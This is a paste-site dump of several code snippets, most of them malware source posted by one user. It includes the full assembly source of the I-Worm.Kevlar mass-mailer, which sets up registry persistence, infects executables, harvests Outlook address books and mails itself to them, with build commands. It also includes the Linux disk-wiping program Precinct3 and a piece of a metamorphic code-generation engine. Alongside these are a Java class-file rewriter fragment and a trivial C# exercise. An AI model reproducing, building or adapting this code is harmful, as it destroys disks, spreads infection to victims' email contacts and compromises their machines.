        for(int i = 0; i < interfaces.length; i++){
            bos.write(interfaces[i]);
        }
        bos.write((byte[]) parsedClass.get(""fields_count""));
        byte[][] fields = (byte[][]) parsedClass.get(""fields"");
        for(int i = 0; i < fields.length; i++){
            bos.write(fields[i]);
        }

        byte[][] methods = (byte[][]) parsedClass.get(""methods"");

        b.clear();
        b.putShort((short) methods.length);
        byte[] methods_count = b.array();
        bos.write(methods_count);
        for(int i = 0; i < methods.length; i++){
            bos.write(methods[i]);
        }

        bos.write((byte[]) parsedClass.get(""attributes_count""));

        byte[][] attributes = (byte[][]) parsedClass.get(""attributes"");
        for(int i = 0; i < attributes.length; i++){
            bos.write(attributes[i]);
        }

        return bos.toByteArray();
    }

    public static void main(String[] args) throws IOException{
        Cheshire();
        System.exit(0);
    }
}"
utsmjtD7,Goat.java,FlyFar,Java,Thursday 27th of July 2023 02:17:46 AM CDT,"public class Goat {
    public static void main(String[] args){
        System.out.println(""Hi! Any code can be running here!"");
    }
}"
r6XZt2BN,I-Worm.Kevlar - Source Code,FlyFar,6502 TASM/64TASS,Thursday 27th of July 2023 02:05:25 AM CDT,"comment #
Name : I-Worm.Kevlar
Author : PetiK
Date : August 7th 2001 - August 16th 2001
Size : 5120 byte

Action : Copy itself to %System%\Kevlar32.exe hidden attribute
			%System%\MScfg32.exe normal attribute
	 Add HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Kevlar32 = %System%\Kevlar32.exe

	* Infect %Windir%\C???????.exe file on writing as ""PetiK"" in the file
	* Infect %Windir%\*.exe It add .htm and create a new file with ActiveX
	* Create C:\__.vbs This filetake all address in th e Address Book at save them in the
	  %windir%\AddBook.txt. The worm scan this file to find the address and send a new mail :

		Subject : Windows Protect !!
		Body :  The smallest software to stop your computer to bug in each time.
			I have found this program on WWW.KEVLAR-PROTECT.COM

			Take a look at the attchment.

					Bye and have a nice day.

		Attachment : MScfg32.exe

	* It creates the %windir%\MSinfo32.txt. I look like this :

		[File Infected]		=> Name of C???????.exe file infected
		CLEANMGR.EXE=Infected by W32.Kevlar.PetiK
		CVTAPLOG.EXE=Infected by W32.Kevlar.PetiK

		[EMail saved]		=> Some address found in the address book
		first@mail.com=Next victim
		second@mail.com=Next victim


To build the worm:
tasm32 /M /ML Kevlar
tlink32 -Tpe -aa -x Kevlar,,,import32
upx -9 Kevlar.exe

To delete the worm:
@echo off
del %windir%\system\Kevlar32.exe
del %windir%\system\MScfg32.exe
del %windir%\*.exe.htm
del %windir%\MSinfo32.txt
del %windir%\AddBook.txt

#

.586p
.model flat
.code

JUMPS

callx macro a
extrn a:proc
call a
endm

include useful.inc

DEBUT:	
F_NAME:	push  50
	mov   esi,offset Orig
	push  esi
	push  0
	callx GetModuleFileNameA

	mov   edi,offset CopyName2
	push  edi
	push  50
	push  edi
	callx GetSystemDirectoryA
	add   edi,eax
	mov   eax,'cSM\'
	stosd
	mov   eax,'23gf'
	stosd
	mov   eax,'exe.'
	stosd
	pop   edi
	push  0
	push  edi
	push  esi
	callx CopyFileA

	mov   edi,offset CopyName
	push  edi
	push  50
	push  edi
	callx GetSystemDirectoryA
	add   edi,eax
	mov   al,'\'
	stosb
	mov   eax,'lveK'
	stosd
	mov   eax,'23ra'
	stosd
	mov   eax,'exe.'
	stosd
	pop   edi

	push  esi
	callx GetFileAttributesA
	cmp   eax,1
	je    SUITE

	push  0
	push  edi
	push  esi
	callx CopyFileA

	push  01h
	push  edi
	callx SetFileAttributesA


REG:	pushad
	@pushsz ""SHLWAPI.dll""
	callx LoadLibraryA
	test  eax,eax
	jz    FIN
	mov   edi,eax
	@pushsz ""SHSetValueA""
	push  edi
	callx GetProcAddress
	test  eax,eax
	jz    FIN
	mov   esi,eax
	push  08h
	push  offset CopyName
	push  01h
	@pushsz ""Kevlar32""
	@pushsz ""SOFTWARE\Microsoft\Windows\CurrentVersion\Run""
	push  80000002h
	call  esi
	push  edi
	callx FreeLibrary
	popad

	call  Nick
	
	mov   edi,offset nickname
	push  40h
	@pushsz ""Hello, my name is :""
	push  edi
	push  0
	callx MessageBoxA

	call  Infect

	jmp   FIN

SUITE:	call  Infect2
VB_F:	pushad
	push  00h
	push  80h
	push  02h
	push  00h
	push  01h
	push  40000000h
	@pushsz ""C:\__.vbs""
	callx CreateFileA
	test  eax,eax
	xchg  edi,eax
	push  00h
	push  offset octets
	push  VBSSIZE
	push  offset vbsd
	push  edi
	callx WriteFile
	push  edi
	callx CloseHandle
	popad
	push  1
	@pushsz ""wscript C:\__.vbs""
	callx WinExec
	push  10000
	callx Sleep
	@pushsz ""C:\__.vbs""
	callx DeleteFileA

SCAN1:	mov   edi,offset addbook
	push  edi
	push  50
	push  edi
	callx GetWindowsDirectoryA
	add   edi,eax
	mov   eax,""ddA\""
	stosd
	mov   eax,""kooB""
	stosd
	mov   eax,""txt.""
	stosd
	xor   eax,eax
	stosd
	call  OPEN

FIN:	push  00h
	callx ExitProcess

	Nick 	Proc
	mov   edi,offset nickname
	callx GetTickCount
	push  9
	pop   ecx
	xor   edx,edx
	div   ecx
	inc   edx
	mov   ecx,edx
	name_g:
	push  ecx
	callx GetTickCount
	push  'Z'-'A'
	pop   ecx
	xor   edx,edx
	div   ecx
	xchg  eax,edx
	add   al,'A'
	stosb
	callx GetTickCount
	push  100
	pop   ecx
	xor   edx,edx
	div   ecx
	push  edx
	callx Sleep
	pop   ecx
	loop  name_g
	ret
	Nick	EndP

	Infect  Proc
	pushad
	push  50
	push  offset WinPath
	callx GetWindowsDirectoryA
	push  offset WinPath
	callx SetCurrentDirectoryA
	FFF:
	push  offset Search
	@pushsz ""C???????.exe""
	callx FindFirstFileA
	inc   eax
	je    F_INF
	dec   eax
	mov   [exeHdl],eax
	I_FILE:
	mov   verif,0
	xor   eax,eax
	push  eax
	push  eax
	push  03h
	push  eax
	push  eax
	push  80000000h or 40000000h
	push  offset Search.cFileName
	callx CreateFileA
	inc   eax
	jz    FNF
	dec   eax
	xchg  eax,ebx

	xor   eax,eax
	push  eax
	push  eax
	push  eax
	push  04h
	push  eax
	push  ebx	
	callx CreateFileMappingA
	test  eax,eax
	jz    CL1
	xchg  eax,ebp

	xor   eax,eax
	push  eax
	push  eax
	push  eax
	push  06h
	push  ebp
	callx MapViewOfFile
	test  eax,eax
	jz    CL2
	xchg  eax,edi
	
	mov   esi,eax
	cmp   word ptr [esi],""ZM""
	jne   CL2
	cmp   byte ptr [esi+18h],""@""
	jne   CL2
	cmp   word ptr [esi+80h],""EP""
	jne   CL2
	cmp   byte ptr [esi+12h],""P""
	je    CL2
	mov   word ptr [esi+12h],""eP""
	mov   word ptr [esi+14h],""it""
	mov   byte ptr [esi+16h],""K""
	inc   verif
	push  edi
	callx UnmapViewOfFile
	CL2:
	push  ebp
	callx CloseHandle
	CL1:
	push  ebx
	callx CloseHandle

	cmp   verif,1
	jne   FNF
	mov   edi,offset InfoFile
	push  edi
	push  50
	push  edi
	callx GetWindowsDirectoryA
	add   edi,eax
	mov   eax,'iSM\'
	stosd
	mov   eax,'3ofn'
	stosd
	mov   eax,'xt.2'
	stosd
	mov   al,'t'
	stosb
	pop   edi
	mov   esi,edi
	push  esi
	@pushsz ""Infected by W32.Kevlar.PetiK""
	push    offset Search.cFileName
	@pushsz ""File Infected""	
	callx   WritePrivateProfileStringA

	FNF:
	push  offset Search
	push  [exeHdl]
	callx FindNextFileA
	test  eax,eax
	jne   I_FILE
	FC:
	push  [exeHdl]
	callx FindClose
	F_INF:
	popad
	ret
	Infect	EndP

	Infect2	Proc
	pushad
	push  50
	push  offset WinPath
	callx GetWindowsDirectoryA
	push  offset WinPath
	callx SetCurrentDirectoryA
	FFF2:
	push  offset Search
	@pushsz ""*.exe""
	callx FindFirstFileA
	inc   eax
	je    F_INF2
	dec   eax
	mov   [exeHdl],eax
	I_FILE2:
	pushad
	mov   edi,offset Search.cFileName
	push  edi
	callx lstrlen
	add   edi,eax
	mov   eax,""mth.""
	stosd
	xor   eax,eax
	stosd
	push  00h
	push  80h
	push  02h
	push  00h
	push  01h
	push  40000000h
	push  offset Search.cFileName
	callx CreateFileA
	test  eax,eax
	xchg  ebp,eax
	push  00h
	push  offset octets
	push  HTMSIZE
	push  offset htmd
	push  ebp
	callx WriteFile
	push  ebp
	callx CloseHandle
	popad
	FNF2:
	push  offset Search
	push  [exeHdl]
	callx FindNextFileA
	test  eax,eax
	jne   I_FILE2
	FC2:
	push  [exeHdl]
	callx FindClose
	F_INF2:
	popad
	ret
	Infect2	EndP

OPEN:	pushad
	push  00h
	push  80h
	push  03h
	push  00h
	push  01h
	push  80000000h
	push  offset addbook
	callx CreateFileA
	inc   eax
	je    NO
	dec   eax
	xchg  eax,ebx

	xor   eax,eax
	push  eax
	push  eax
	push  eax
	push  02h
	push  eax
	push  ebx
	callx CreateFileMappingA
	test  eax,eax
	je    F1
	xchg  eax,ebp

	xor   eax,eax
	push  eax
	push  eax
	push  eax
	push  04h
	push  ebp
	callx MapViewOfFile
	test  eax,eax
	je    F2
	xchg  eax,esi

	push  00h
	push  ebx
	callx GetFileSize
	cmp   eax,03h
	jbe   F3					; is the file empty ??

	call  SCAN

F3:	push  esi
	callx UnmapViewOfFile
F2:	push  ebp
	callx CloseHandle
F1:	push  ebx
	callx CloseHandle
NO:	popad
	ret

	SCAN:
	pushad
	xor   edx,edx
	mov   edi,offset m_addr
	push  edi
	p_c:  lodsb
	cmp   al,"" ""
	je    car_s
	cmp   al,0dh
	je    entr1
	cmp   al,0ah
	je    entr2
	cmp   al,""!""
	je    f_mail
	cmp   al,""@""
	je    not_a
	inc   edx
	not_a:	stosb
		jmp p_c
	car_s:	inc esi
		jmp p_c
	entr1:	xor al,al
		stosb
		pop edi
		test edx,edx
		je  SCAN
		call SEND_MAIL
		jmp SCAN
	entr2:	xor al,al
		stosb
		pop edi
		jmp SCAN
	f_mail:	popad
		ret

	SEND_MAIL:
		push  50
		push  offset save_addr
		callx GetWindowsDirectoryA
		@pushsz ""\MSinfo32.txt""
		push  offset save_addr
		callx lstrcat
		push  offset save_addr
		@pushsz ""Next victim""
		push  offset m_addr
		@pushsz ""EMail saved""	
		callx   WritePrivateProfileStringA
		xor   eax,eax
		push  eax
		push  eax
		push  offset Message
		push  eax
		push  [MAPIHdl]
		callx MAPISendMail
		ret



.data
; ===== INSTALLATION =====
Orig		db 50 dup (0)
CopyName	db 50 dup (0)
CopyName2	db 50 dup (0)
nickname	db 11 dup (?)

; ===== INFECTION =====
InfoFile	db 50 dup (0)
WinPath		db 50 dup (0)
exeHdl		dd ?
verif		dd ?
octets		dd ?

; ===== MAIL =====
addbook		db 50 dup (0)
save_addr	db 50 dup (0)
m_addr		db 128 dup (?)
MAPIHdl		dd 0
subject		db ""Windows Protect !!"",00h
body		db ""The smallest software to stop your computer to bug in each time."",0dh,0ah
		db ""I have found this program on WWW.KEVLAR-PROTECT.COM"",0dh,0ah,0dh,0ah
		db ""Take a look at the attchment."",0dh,0ah,0dh,0ah
		db 09h,09h,""Bye and have a nice day."",00h
NameFrom	db ""Your friend"",00h


Message		dd ?
		dd offset subject
		dd offset body
		dd ?
		dd ?
		dd ?
		dd 2
		dd offset MsgFrom
		dd 1
		dd offset MsgTo
		dd 1
		dd offset Attach

MsgFrom		dd ?
		dd ?
		dd NameFrom
		dd ?
		dd ?
		dd ?

MsgTo		dd ?
		dd 1
		dd offset m_addr
		dd offset m_addr
		dd ?
		dd ?

Attach		dd ?
		dd ?
		dd ?
		dd offset CopyName2
		dd ?
		dd ?

		

htmd:
db '<html><head><title>PetiKVX come back</title></head><body>',0dh,0ah
db '<script language=vbscript>',0dh,0ah
db 'on error resume next',0dh,0ah
db 'set fso=createobject(""scripting.filesystemobject"")',0dh,0ah
db 'If err.number=429 then',0dh,0ah
db 'document.write ""<font face=''verdana'' size=''2'' color=''#FF0000''>'
db 'You need ActiveX enabled to see this file<br><a href=''javascript:location.reload()''>'
db 'Click Here</a> to reload and click Yes</font>""',0dh,0ah
db 'Else',0dh,0ah
db 'Set ws=CreateObject(""WScript.Shell"")',0dh,0ah
db 'document.write ""<font face=''verdana'' size=''3'' color=red>'
db 'This page is generate by a worm<br>But this worm is proteced by Kevlar<br></font>""',0dh,0ah
db 'document.write ""<font face=''verdana'' size=''2'' color=blue><br>'
db 'Worms are not dangerous for your computer but to survive, they must be strong</font>""',0dh,0ah
db 'ws.RegWrite ""HKCU\Software\Microsoft\Internet Explorer\Main\Start Page"",""http://www.avp.ch""',0dh,0ah
db 'End If',0dh,0ah
db '</script></html>',00h
HTMSIZE	= $-htmd

vbsd:
db 'On Error Resume Next',0dh,0ah
db 'Set Kevlar = CreateObject(""Outlook.Application"")',0dh,0ah
db 'Set L = Kevlar.GetNameSpace(""MAPI"")',0dh,0ah
db 'Set f=CreateObject(""Scripting.FileSystemObject"")',0dh,0ah
db 'Set c=f.CreateTextFile(f.GetSpecialFolder(0)&""\AddBook.txt"")',0dh,0ah
db 'c.Close',0dh,0ah
db 'For Each M In L.AddressLists',0dh,0ah
db 'If M.AddressEntries.Count <> 0 Then',0dh,0ah
db 'For O = 1 To M.AddressEntries.Count',0dh,0ah
db 'Set P = M.AddressEntries(O)',0dh,0ah
db 'Set c=f.OpenTextFile(f.GetSpecialFolder(0)&""\AddBook.txt"",8,true)',0dh,0ah
db 'c.WriteLine P.Address',0dh,0ah
db 'c.Close',0dh,0ah
db 'Next',0dh,0ah
db 'End If',0dh,0ah
db 'Next',0dh,0ah
db 'Set c=f.OpenTextFile(f.GetSpecialFolder(0)&""\AddBook.txt"",8,true)',0dh,0ah
db 'c.WriteLine ""!""',0dh,0ah
db 'c.Close',0dh,0ah
VBSSIZE	= $-vbsd

signature	db ""I-Worm.Kevlar coded by PetiK (c)2001"",00h


MAX_PATH		equ 260
FILETIME		struct
dwLowDateTime		dd ?
dwHighDateTime		dd ?
FILETIME		ends
WIN32_FIND_DATA 	struct
dwFileAttributes	dd ?
ftCreationTime		FILETIME ?
ftLastAccessTime	FILETIME ?
ftLastWriteTime		FILETIME ?
nFileSizeHigh		dd ?
nFileSizeLow		dd ?
dwReserved0		dd ?
dwReserved1		dd ?
cFileName		dd MAX_PATH (?)
cAlternateFileName	db 13 dup (?)
			db 3 dup (?)
WIN32_FIND_DATA		ends

Search		WIN32_FIND_DATA <>


end DEBUT
end"
ueeesd4p,Virus.Lunix.Precinct3 - Source Code,FlyFar,ASM (NASM),Thursday 27th of July 2023 02:03:41 AM CDT,";;;;;;;;; ;;;;;;;;; ;;;;;;;;; ;;;;;;;;; ;;;;;;;;; ;;;   ;;; ;;;;;;;;; ;;;;;;;;; 
;;;   ;;; ;;;   ;;; ;;;       ;;;          ;;;    ;;;;  ;;; ;;;          ;;;    
;;;;;;;;; ;;;;;;;;; ;;;;;;    ;;;          ;;;    ;;; ; ;;; ;;;          ;;;    
;;;       ;;;;;;    ;;;       ;;;          ;;;    ;;;  ;;;; ;;;          ;;;    
;;;       ;;;   ;;; ;;;;;;;;; ;;;;;;;;; ;;;;;;;;; ;;;   ;;; ;;;;;;;;;    ;;;    
;-------------------------------------------------------------------------------
;                                /!\ WARNING /!\                                
;      This program WILL destroy your disk. Run at your own risk, and only      
;                   on systems you are authorized to destroy.                   
;                                                                               
; This program opens /proc/self/mountinfo to enumerate filesystems and disks.   
; It finds where the filesystem root (/) is mounted, and writes a pattern to    
; the entirety of the disk.                                                     
;                                                                               
; Using /proc/self/mountinfo to find / :                                        
;                                                                               
; [ EXAMPLE ]                                                                   
;                                                                               
; $ grep '/ / ' /proc/self/mountinfo                                            
; 32 1 259:2 / / rw,relatime shared:1 - ext4 /dev/nvme0n1p2 rw,errors=remount-ro
; $ grep '/ / ' /proc/self/mountinfo                                            
; 25 0 8:0 / / rw,relatime shared:1 - ext4 /dev/sda rw,errors=remount-ro        
;                                                                               
; Build:                                                                        
; $ nasm -f elf64 p3.asm ; ld p3.o -o p3                                        
; Run:                                                                          
; $ sudo ./p3                                                                   
;----------------------------------------------------------------- @netspooky --
                               ;;;;;;;;; ;;;   ;;; ;;;;;;;;; ;;;;;;;;; ;;;;;;;;;
                                  ;;;    ;;;   ;;; ;;;   ;;; ;;;       ;;;      
                                  ;;;    ;;;;;;;;; ;;;;;;;;; ;;;;;;    ;;;;;;   
                                  ;;;    ;;;   ;;; ;;;;;;    ;;;       ;;;      
                                  ;;;    ;;;   ;;; ;;;   ;;; ;;;;;;;;; ;;;;;;;;;
;-------------------------------------------------------------------------------
section .text                                                                  ;
global _start                                                                  ;
_start:                                                                        ;
    mov rdi, 0x6f666e69         ; Pushing the                                  ;
    push rdi                    ; file name                                    ;
    mov rdi, 0x746e756f6d2f666c ; /proc/self/mountinfo                         ;
    push rdi                    ; onto the stack                               ;
    mov rdi, 0x65732f636f72702f ; ...                                          ;
    push rdi                    ; ...                                          ;
    mov rdi, rsp                ; const char *pathname                         ;
    xor rsi, rsi                ; int flags - O_RDONLY                         ;
    mov rax, rsi                ; 0                                            ;
    inc rax                     ; 1                                            ;
    inc rax                     ; 2 - open syscall                             ;
    syscall                     ;                                              ;
reader: ; Reading /proc/self/mountinfo so we can parse it.                     ;
    inc rdx                     ; 1                                            ;
    shl rdx, 14                 ; size_t count - # of bytes to read - 0x400    ;
    sub rsp, rdx                ; Make space on the stack - 0x400              ;
    mov r9, rax                 ; Save fd in r9 for later                      ;
    mov rdi, rax                ; int fd - The file descriptor                 ;
    mov rsi, rsp                ; void *buf - The buffer that is the stack     ;
    xor eax, eax                ; 0 - read syscall                             ;
    syscall                     ; RSI still contains the buffer after syscall  ;
    mov di, 0x202f              ; '/ ' - The byte pattern to look for          ;
    xor rcx, rcx                ; 0                                            ;
    inc rcx                     ; 1                                            ;
    shl rcx, 14                 ; 0x400 - Counter for reading the file chunk   ;
comp1: ; Looking for the first slash and space in each entry                   ;
    mov bx, word[rsp]           ; Move word to bl                              ;
    cmp di, bx                  ; Compare to the '/ ' pattern                  ;
    je comp2                    ; Disk entry found, onto next comparison       ;
    dec rcx                     ; Decrement counter                            ;
    jz xxit                     ; Jump if zero to the end                      ;
    inc rsp                     ; Read the next byte in the file               ;
    jmp comp1                   ; Jump back to the top                         ;
comp2: ; Here we are looking for the next slash and space                      ;
    inc rsp                     ; Since we already know the two bytes at the   ;
    inc rsp                     ; pointer, inc twice to get next two bytes     ;
    mov bx, word[rsp]           ; Move word to bl                              ;
    cmp di, bx                  ; Make the same comparison to '/ '             ;
    je comp3                    ; Disk holding / was found                     ;
    dec rcx                     ; Decrement counter                            ;
    jz xxit                     ; Jump if zero to the end                      ;
    dec rcx                     ; Decrement counter                            ;
    jz xxit                     ; Jump if zero to the end                      ;
    inc rsp                     ; If we didn't find anything, keep going       ;
    jmp comp1                   ; And back to first comparison                 ;
comp3: ; At this point, we have located the '/ / ' record, so we can look for  ;
       ; the next slash in the disk name                                       ;
    inc rsp                     ; Increment through the rest of the line       ;
    mov bl, byte[rsp]           ; Get just one byte now                        ;
    cmp dil, bl                 ; dil contains '/'                             ;
    je prep                     ; If we found it, we have the disk name        ;
    jmp comp3                   ; If not, keep going                           ;
prep: ; Preparing for the final comparison                                     ;
    xor rcx, rcx                ; This will hold the length of the disk name   ;
    mov dil, 0x20               ; We are now looking for a space.              ;
getdisk: ; Here we are grabbing the entire disk name                           ;
    inc rsp                     ; Increment the index                          ;
    inc rcx                     ; Increment our length counter                 ;
    mov bl, byte[rsp]           ; Grab a byte                                  ;
    cmp dil, bl                 ; Compare to a ' ' char                        ;
    je opendisk                 ; If it matches, we found it!                  ;
    jmp getdisk                 ; If not, keep going!                          ;
opendisk: ; Now we are going to open the disk as a file as we did earlier.     ;
    xor rsi, rsi                ; 0                                            ;
    add rsp, 8                  ; Pushing a 0 for the null...                  ;
    push rsi                    ; ...terminator on the disk name string.       ;
    sub rsp, rcx                ; Now RSP points to the disk name              ;
    mov rdi, rsp                ; const char *pathname - pointer to disk name  ;
    inc rsi                     ; 1                                            ;
    inc rsi                     ; 2 - O_RDWR                                   ;
    mov rax, rsi                ; 2 - open syscall                             ;
    syscall                                                                    ;
writer: ; We now have the disk open in RW mode, no append.                     ;
    mov rdi, rax                ; int fd - The file descriptor                 ;
    mov rsi, 0x7557575757575775 ; This is the marker payload - uWWWWWWu        ;
    push rsi                    ; Push the payload                             ;
    mov rsi, rsp                ; const void *buf - Payload pointer            ;
    xor rax, rax                ; 0                                            ;
    inc rax                     ; 1 - write syscall                            ;
    mov rdx, rax                ; Get that 1                                   ;
    shl rdx, 3                  ; 8 size_t count - # of bytes to write         ;
    syscall                                                                    ;
lseeker: ; We have to set up the lseek call so that we will continue writing   ;
         ; to the next byte in the file upon each additional write.            ;
    xor rdx, rdx                ; 0                                            ;
    inc rdx                     ; int whence; 1 = SEEK_SET                     ;
    mov rsi, rdx                ; 1                                            ;
    shl rsi, 3                  ; off_t offset; 8 - # of bytes to seek         ;
    mov rax, rsi                ; 8 - lseek syscall                            ;
    syscall                     ; Note that RDI still contains fd              ;
writer2: ; The final write loop, likely segfaults                              ;
    mov rsi, 0xABACABACABACABAC ; This is the pattern payload                  ;
    push rsi                    ; Push the payload                             ;
    mov rsi, rsp                ; const void *buf - Payload pointer            ;
    xor rax, rax                ; 0                                            ;
    inc rax                     ; 1 - write syscall                            ;
    mov rdx, rax                ; Get that 1                                   ;
    shl rdx, 3                  ; 8 size_t count - # of bytes to write         ;
    syscall                                                                    ;
    jmp writer2                 ; Bring it around town                         ;
xxit: ; This is really only here in case of failure                            ;
    mov al, 0x3c                ; exit syscall                                 ;
    xor rdi, rdi                ; 0 - Return code                              ;
    syscall ;------------------------------------------------------------------;
            ; Dedicated to those fighting for police accountability worldwide. ;
            ;------------------------------------------------------------------;
"
hhUTita2,Сакутин_дз7_исправленный,MIROGame,C#,Thursday 27th of July 2023 01:59:41 AM CDT,"string stringNumber = ""256"";
 
int numberFromString = Convert.ToInt32(stringNumber);
 
int square = numberFromString * numberFromString;
 
Console.WriteLine(""Квадрат введенного числа равен "" +  square);"
vpWvxiCV,evolus_factory/alphabeth.inc,FlyFar,ASM (NASM),Thursday 27th of July 2023 01:58:21 AM CDT,"InstructionSetSize=37 ; It is 32, but 32=2^N, thus very bad for LCG
		      ; 37 is the enxt bigger prime, thus=good ;)
AminoAcidList FIX @nopREAL,@nopsA,@nopsB,@nopsD,@nopdA,@nopdB,@nopdD,@save,@addsaved,@saveWrtOff,@saveJmpOff,@writeByte,@writeDWord,@getDO,@getdata,@getEIP,@push,@pop,@pushall,@popall,@add0001,@sub0001,@shl,@shr,@xor,@and,@mul,@div,@JnzUp,@JnzDown,@call,@CallAPILoadLibrary

_START EQU StartCodon
_STOP EQU StopCodon

MAX_NUMBER = 999'999'999'999'999'999



macro displayDecNum num* ; useful for debugging
{
    dN1=  num MOD 10
    dN2= ((num-dN1)/10) MOD 10
    dN3= ((num-dN1-dN2)/100) MOD 10
    dN4= ((num-dN1-dN2-dN3)/1'000) MOD 10
    dN5= ((num-dN1-dN2-dN3-dN4)/10'000) MOD 10
    dN6= ((num-dN1-dN2-dN3-dN4-dN5)/100'000) MOD 10
    dN7= ((num-dN1-dN2-dN3-dN4-dN5-dN6)/1'000'000) MOD 10
    dN8= ((num-dN1-dN2-dN3-dN4-dN5-dN6-dN7)/10'000'000) MOD 10
    dN9= ((num-dN1-dN2-dN3-dN4-dN5-dN6-dN7-dN8)/100'000'000) MOD 10
    dN10=((num-dN1-dN2-dN3-dN4-dN5-dN6-dN7-dN8-dN9)/1'000'000'000) MOD 10
    dN11=((num-dN1-dN2-dN3-dN4-dN5-dN6-dN7-dN8-dN9-dN10)/10'000'000'000) MOD 10
    dN12=((num-dN1-dN2-dN3-dN4-dN5-dN6-dN7-dN8-dN9-dN10-dN11)/100'000'000'000) MOD 10
    dN13=((num-dN1-dN2-dN3-dN4-dN5-dN6-dN7-dN8-dN9-dN10-dN11-dN12)/1'000'000'000'000) MOD 10
    dN14=((num-dN1-dN2-dN3-dN4-dN5-dN6-dN7-dN8-dN9-dN10-dN11-dN12-dN13)/10'000'000'000'000) MOD 10
    dN15=((num-dN1-dN2-dN3-dN4-dN5-dN6-dN7-dN8-dN9-dN10-dN11-dN12-dN13-dN14)/100'000'000'000'000) MOD 10
    dN16=((num-dN1-dN2-dN3-dN4-dN5-dN6-dN7-dN8-dN9-dN10-dN11-dN12-dN13-dN14-dN15)/1'000'000'000'000'000) MOD 10
    dN17=((num-dN1-dN2-dN3-dN4-dN5-dN6-dN7-dN8-dN9-dN10-dN11-dN12-dN13-dN14-dN15-dN16)/10'000'000'000'000'000) MOD 10
    dN18=((num-dN1-dN2-dN3-dN4-dN5-dN6-dN7-dN8-dN9-dN10-dN11-dN12-dN13-dN14-dN15-dN16-dN17)/100'000'000'000'000'000) MOD 10
    display dN18+'0',dN17+'0',dN16+'0',dN15+'0',dN14+'0',dN13+'0',dN12+'0',dN11+'0',dN10+'0',dN9+'0',dN8+'0',dN7+'0',dN6+'0',dN5+'0',dN4+'0',dN3+'0',dN2+'0',dN1+'0',13,10
}

macro displayList list*
{
    display '0: '
    displayDecNum list#0
    display '1: '
    displayDecNum list#1
    display '2: '
    displayDecNum list#2
    display '3: '
    displayDecNum list#3
    display '4: '
    displayDecNum list#4
    display '5: '
    displayDecNum list#5
    display '6: '
    displayDecNum list#6
    display '7: '
    displayDecNum list#7
    display '8: '
    displayDecNum list#8
    display '9: '
    displayDecNum list#9

}


macro appendToList list*, codon*
{
    if list#0<(MAX_NUMBER/1'000)
	list#0=(list#0*1'000)+codon
    else if list#1<(MAX_NUMBER/1'000)
	list#1=(list#1*1'000)+codon
    else if list#2<(MAX_NUMBER/1'000)
	list#2=(list#2*1'000)+codon
    else if list#3<(MAX_NUMBER/1'000)
	list#3=(list#3*1'000)+codon
    else if list#4<(MAX_NUMBER/1'000)
	list#4=(list#4*1'000)+codon
    else if list#5<(MAX_NUMBER/1'000)
	list#5=(list#5*1'000)+codon
    else if list#6<(MAX_NUMBER/1'000)
	list#6=(list#6*1'000)+codon
    else if list#7<(MAX_NUMBER/1'000)
	list#7=(list#7*1'000)+codon
    else if list#8<(MAX_NUMBER/1'000)
	list#8=(list#8*1'000)+codon
    else if list#9<(MAX_NUMBER/1'000)
	list#9=(list#9*1'000)+codon
    else
	display ""Too much codons added"",13,10,"" for one amino acid""
	err
	; 10*6+1=61 codons map to one amino acid...
    end if
}


getListSizeRV = 0
macro getListSize list*
{
    multiplicator=0
    number=list#0
    if list#9>0
	multiplicator=9
	number=list#9
    else if list#8>0
	multiplicator=8
	number=list#8
    else if list#7>0
	multiplicator=7
	number=list#7
    else if list#6>0
	multiplicator=6
	number=list#6
    else if list#5>0
	multiplicator=5
	number=list#5
    else if list#4>0
	multiplicator=4
	number=list#4
    else if list#3>0
	multiplicator=3
	number=list#3
    else if list#2>0
	multiplicator=2
	number=list#2
    else if list#1>0
	multiplicator=1
	number=list#1
    end if

    addend = 0
    while number>0
	addend=addend+1
	number=number/1000
    end while

    getListSizeRV=(multiplicator*6+addend)
}


getItemRV=0
IsJnzDown=0
macro getItem list*, index*
{
; gives elements in a special order: starting from list#0[5]...list#0[0] -> list#1[5]...list#2[0]
; could be changed, but no need for that as it will be only called by getRandomItem.

    getListSize list

    number=0
    if index<getListSizeRV
	if (index/(9*6))>0
	    number=list#9
	else if (index/(8*6))>0
	    number=list#8
	else if (index/(7*6))>0
	    number=list#7
	else if (index/(6*6))>0
	    number=list#6
	else if (index/(5*6))>0
	    number=list#5
	else if (index/(4*6))>0
	    number=list#4
	else if (index/(3*6))>0
	    number=list#3
	else if (index/(2*6))>0
	    number=list#2
	else if (index/(1*6))>0
	    number=list#1
	else
	    number=list#0
	end if

	newindex=index MOD 6

	while newindex>0
	    number=number/1000
	    newindex=newindex-1
	end while

	getItemRV=number MOD 1000

    else
	display 'Tried to access an element',13,10,'that doesnt exist'
	err
    end if

    list#42=list#42+1
}


macro getRandomItem list*
{
    getListSize list
    GetNewRandomNumber
    RndElement = (RndNum SHR 16) MOD getListSizeRV

    getItem list, RndElement

    db getItemRV

;    displayDecNum getItemRV

}


macro CreateEmptyList list*
{
    list#0 = 0
    list#1 = 0
    list#2 = 0
    list#3 = 0
    list#4 = 0
    list#5 = 0
    list#6 = 0
    list#7 = 0
    list#8 = 0
    list#9 = 0

    list#42 = 0     ; How often a codon called an amino acid

    list#666 = 0    ; How much different codons map one amino acid
}

macro CalculateListSizeOfAminoAcids [AminoAcid]
{
    getListSize AminoAcid#.list
    AminoAcid#.list666=getListSizeRV
    display `AminoAcid,': '
    displayDecNum AminoAcid#.list666
}


macro displayAminoAcidDistribution [AminoAcid]
{
    display `AminoAcid,': '
    displayDecNum AminoAcid#.list42
}


;macro CreateAnIntron
;{
;    GetNewRandomNumber
;    if ((RndNum SHR 16) MOD IntronInsertThreshold)=0

;        WhichIntron=((RndNum SHR 16) MOD 3)
;        if WhichIntron=0
;            db StopCodon
;        end if

;        GetNewRandomNumber

;        while ((RndNum SHR 16) MOD 37)<>0
;            GetNewRandomNumber
;            RRR=((RndNum SHR 16) MOD 255)
;            if WhichIntron=0
;                db (RRR XOR 0x67)
;            else
;                db (RRR OR 0x91)
;            end if
;        end while

;        if WhichIntron=0
;            db StartCodon
;        end if
;    end if
;}


macro CreatePaddedInstruction instr*, op1, op2
{
    virtual at 0
	if op2 eq
	    if op1 eq
		instr
	    else
		instr op1
	    end if
	else
	    instr op1,op2
	end if
	InstrSize = $
    end virtual

    GetNewRandomNumber
    NOPsBefore=(RndNum MOD (8-InstrSize+1))


    times NOPsBefore: nop

    if op2 eq
	if op1 eq
	    instr
	else
	    instr op1
	end if
    else
	instr op1,op2
    end if

    times (8-InstrSize-NOPsBefore): nop
}


; @command.list ... list that contains all codons that point to the amino acid
